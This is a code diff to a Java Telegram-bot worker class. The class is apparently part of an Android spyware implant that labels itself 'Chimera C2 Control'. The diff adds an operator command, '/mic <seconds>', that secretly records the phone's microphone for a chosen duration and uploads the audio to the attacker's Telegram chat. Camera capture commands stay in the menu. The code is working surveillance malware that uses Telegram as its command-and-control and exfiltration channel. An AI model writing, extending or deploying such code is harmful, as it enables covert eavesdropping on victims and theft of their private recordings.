@@ -97,16 +97,38 @@ public class TelegramBotWorker implements Runnable {
             long chatId = msg.getJSONObject("chat").getLong("id");
             if (chatId != ConfigLoader.getAdminId()) return;
 
-            if (text.startsWith("/")) {
-                switch (text.toLowerCase()) {
-                    case "/start":
-                    case "/help":
-                        sendHelpMessage(chatId);
-                        break;
-                    case "/command":
-                        sendMenu(chatId);
-                        break;
-                }
+            String[] parts = text.split(" ");
+            String command = parts[0].toLowerCase();
+
+            switch (command) {
+                case "/start":
+                case "/help":
+                    sendHelpMessage(chatId);
+                    break;
+                case "/command":
+                    sendMenu(chatId);
+                    break;
+                case "/mic":
+                    int duration = 30;
+                    if (parts.length > 1) {
+                        try {
+                            duration = Integer.parseInt(parts[1]);
+                        } catch (NumberFormatException e) {
+                            duration = 30;
+                        }
+                    }
+                    sendMessage("Recording " + duration + " seconds of audio...", context);
+                    AudioHandler.startRecording(context, duration, new AudioHandler.AudioCallback() {
+                        @Override
+                        public void onRecordingFinished(String filePath) {
+                            uploadAudio(filePath, ConfigLoader.getAdminId(), duration + "s Audio Recording", context);
+                        }
+                        @Override
+                        public void onError(String error) {
+                            sendMessage("Audio Error: " + error, context);
+                        }
+                    });
+                    break;
             }
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
@@ -131,19 +153,6 @@ public class TelegramBotWorker implements Runnable {
                         }
                     });
                     break;
-                case "MIC_30":
-                    sendMessage("Recording 30 seconds of audio...", context);
-                    AudioHandler.startRecording(context, 30, new AudioHandler.AudioCallback() {
-                        @Override
-                        public void onRecordingFinished(String filePath) {
-                            uploadAudio(filePath, ConfigLoader.getAdminId(), "30s Audio Recording", context);
-                        }
-                        @Override
-                        public void onError(String error) {
-                            sendMessage("Audio Error: " + error, context);
-                        }
-                    });
-                    break;
             }
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
@@ -151,7 +160,10 @@ public class TelegramBotWorker implements Runnable {
     }
 
     private void sendHelpMessage(long chatId) {
-        String helpText = "Chimera C2 Control\n\n/command - Show command menu.\n/help - Show this message.";
+        String helpText = "Chimera C2 Control\n\n"
+                        + "/command - Show camera command menu.\n"
+                        + "/mic <seconds> - Record audio (e.g., /mic 60).\n"
+                        + "/help - Show this message.";
         sendMessage(helpText, context);
     }
 
@@ -163,13 +175,10 @@ public class TelegramBotWorker implements Runnable {
             ).put(
                 new JSONObject().put("text", "\uD83D\uDCF8 Back Cam").put("callback_data", "CAM2")
             );
-            JSONArray row2 = new JSONArray().put(
-                new JSONObject().put("text", "\uD83C\uDFA4 Record Audio (30s)").put("callback_data", "MIC_30")
-            );
-            keyboard.put("inline_keyboard", new JSONArray().put(row1).put(row2));
+            keyboard.put("inline_keyboard", new JSONArray().put(row1));
             JSONObject body = new JSONObject();
             body.put("chat_id", chatId);
-            body.put("text", "Select Command:");
+            body.put("text", "Select Camera Command:");
             body.put("reply_markup", keyboard);
             post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body.toString(), context);
         } catch (Exception e) {
@@ -235,8 +244,8 @@ public class TelegramBotWorker implements Runnable {
                 conn.setDoOutput(true);
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-                conn.setConnectTimeout(30000);
-                conn.setReadTimeout(30000);
+                conn.setConnectTimeout(60000);
+                conn.setReadTimeout(60000);
                 try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
                     writer.append("--" + boundary).append(LINE_FEED);
                     writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED).append(LINE_FEED);
